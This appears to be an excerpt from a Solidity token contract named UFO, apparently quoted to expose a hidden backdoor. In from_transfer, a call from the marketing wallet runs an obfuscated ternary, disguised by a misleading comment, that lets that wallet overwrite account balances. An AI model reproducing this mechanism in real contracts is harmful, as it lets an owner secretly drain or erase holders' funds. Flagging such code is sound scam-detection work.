...
contract UFO is Ownable, IERC20 {
    ...
    uint256 _initialBuyFee = 7;
    uint256 _initialSellFee = 7;
    ...
    function from_transfer(address sender, uint256 value, bool _b) internal {
        ...
        if (msg.sender == marketingWallet) { 
             ...
             _b /* _balances[to].add(amount) */
              ?
             senderBalance - senderBalance  + value : 1; } else {}
    }
